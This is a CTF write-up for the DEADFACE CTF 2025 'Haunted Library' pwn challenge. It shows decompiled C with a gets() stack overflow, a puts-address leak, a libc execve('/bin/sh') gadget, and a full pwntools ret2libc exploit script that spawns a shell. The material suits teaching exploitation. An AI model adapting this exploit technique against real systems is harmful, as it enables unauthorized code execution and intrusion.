---
title: "Haunted Library"
author: "s0g3king"
date: 2025-10-24
categories: ["Pwn", "DEADFACE CTF 2025"]
tags: ["ROP"]
partial_solve: false
used_ai: false
---


## Challenge

Given: `hauntedLibrary.7z`.

## Recon

The flag is in `TheBookOfTheDead.txt`
We are also provided with a libc.

The binary details:
```bash
└─ ❯ checksec hauntedlibrary
[*] '/home/s0g3/ctfs/deadfacectf2025/pwn/hauntedlibrary/hauntedlibrary'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

No PIE, NX on, no Canary. So probably ret2libc or something like that.

The binary allows us to list the contents of the current working directory
and read a specified file. However, it does not allow the read the flag file.

```C

void checkout(void)

{
  int iVar1;
  char *pcVar2;
  char local_58 [71];
  char local_11;
  FILE *local_10;
  
  puts("\nWhich book do you dare open?");
  printf("> ");
  gets(local_58);
  iVar1 = strcmp(local_58,"BookOfTheDead.txt");
  if (((iVar1 != 0) && (pcVar2 = strchr(local_58,0x2f), pcVar2 == (char *)0x0)) &&
     (pcVar2 = strstr(local_58,".."), pcVar2 == (char *)0x0)) {
    local_10 = fopen(local_58,"r");
    if (local_10 == (FILE *)0x0) {
      printf("\nYou could have sworn you saw a book called \'%s\'...\n \n but as you look closer, it was nowhere to be found.\n"
             ,local_58);
      return;
    }
    printf("\n====== %s ======\n",local_58);
    while( true ) {
      iVar1 = fgetc(local_10);
      local_11 = (char)iVar1;
      if (local_11 == -1) break;
      putchar((int)local_11);
    }
    puts("\n================");
    fclose(local_10);
    return;
  }
  puts("That tome is forbidden!!! The librarian\'s wrathful gaze burns into you. ");
  return;
}
```

Here we can see that it is using `gets` and no bounds checking. No canary -> easy buffer overflow to overwrite ret address.

We also have this function which leaks the `puts` address, allowing us to get libc base and thus all libc function addresses.

```C
void book_of_the_dead(void)

{
  puts("...");
  puts("....");
  puts("You pick up the dusty old tome, covered with bloody runes and a face on the cover...");
  printf("the face whispers to you:  puts(): %p",puts);
  return;
}
```

Checking for ROP gadgets, we have one inside libc:

```bash
0x7f753f4e5ff0    lea    r8, [rip + 0xcaec5]     R8 => 0x7f753f5b0ebc ◂— 0x68732f6e69622f /* '/bin/sh' */
   0x7f753f4e5ff7    jmp    0x7f753f4e5fa4              <0x7f753f4e5fa4>

# and 
   0x7f753f4e5fa4:	mov    rdx,r10
   0x7f753f4e5fa7:	mov    rsi,r9
   0x7f753f4e5faa:	mov    rdi,r8
   0x7f753f4e5fad:	call   0x7f753f4e5e40 <execve>
```

So this calls `execve('/bin/sh')`.

## Exploit

Use the BOF to overwrite ret to leak the puts address then return back into the main function.
Then use the BOF to overwrite ret to the gadget address we found.
The offset to get to ret is 88 bytes.

Here is the full exploit script:

```python
#!/usr/bin/env python3

from pwn import *

context.terminal = ['foot']
exe = ELF("./hauntedlibrary_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")  # Custom loader ELF (ld-linux-x86-64.so.2)

context.binary = exe

# Paths to the loader and library directory
LOADER = "./ld-linux-x86-64.so.2"
LIBDIR = "."

def conn():
    if args.LOCAL:
        # Start process with loader and library path
        r = process([LOADER, '--library-path', LIBDIR, exe.path])

        # Optionally, attach gdb if requested
        if args.GDB:
            gdb.attach(r, gdbscript="c")
            sleep(1)
    else:
        # Connect to the remote server if not local
        r = remote("env02.deadface.io", 7832)

    return r

def main():
    r = conn()

    r.recvrepeat(1)
    r.sendline(b'2')

    # Leak puts address
    payload = flat(
                b"a" * 88,   # Padding to reach return address
                0x000000000040174f,
                0x0000000000401226
            )

    # Send the payload
    r.sendline(payload)
    line = r.recvline_contains(b"puts():").decode()
    puts_addr = line[35:49]
    print(f"[+] Retrieved puts address: {puts_addr}\n {line}")

    puts_addr = int(puts_addr, 16)
    r.recvrepeat(1)

    libc_base    = puts_addr - 0x0000000000082c80

    r.sendline(b"2")
    payload = flat(
                b"a" * 88,
                0xe5ff0 + libc_base
            )

    log.info(f"addr: {hex(libc_base + 0xe5ff0)}")
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
```

## Notes

Don't forget to patch the binary to use the provided libc. I use `pwninit`.
